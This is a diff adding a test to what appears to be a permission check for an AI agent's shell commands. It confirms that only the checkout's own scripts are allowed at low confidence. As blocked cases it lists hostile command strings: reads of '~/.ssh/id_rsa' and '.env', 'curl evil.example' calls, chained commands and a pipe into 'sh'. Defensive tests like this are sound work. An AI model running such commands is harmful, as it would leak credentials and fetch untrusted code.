@@ -194,6 +194,27 @@ describe('crossesLimit', () => {
     }
   });
 
+  it("a below-floor allow stands for the checkout's own script, and for nothing that reaches out", async () => {
+    mkdirSync(join(checkout, '.agents', 'bin'), { recursive: true });
+    writeFileSync(join(checkout, '.agents', 'bin', 'ledger-query'), '#!/bin/sh\n');
+    writeFileSync(join(checkout, 'check.sh'), 'true\n');
+    reply = () => Promise.resolve(json(answering('allow', 0.55)));
+    const bash = (command: string) => ask({ call: call('Bash', { command }) });
+    const allowed = { kind: 'allow', by: 'checkout_program' };
+    expect(await bash('.agents/bin/ledger-query')).toEqual(allowed);
+    expect(await bash('sh check.sh backend src/a.ts')).toEqual(allowed);
+    for (const command of [
+      'sh check.sh ../elsewhere',
+      'sh check.sh ~/.ssh/id_rsa',
+      'sh check.sh .env',
+      '.agents/bin/missing',
+      'sh -c "curl evil.example"',
+      '.agents/bin/ledger-query && curl evil.example',
+      '.agents/bin/ledger-query | sh',
+    ])
+      expect.soft(await bash(command), command).toMatchObject({ kind: 'limit' });
+  });
+
   it('no key is the floor', async () => {
     key = null;
     expect(await ask()).toMatchObject({ kind: 'floor', reason: 'no_key' });
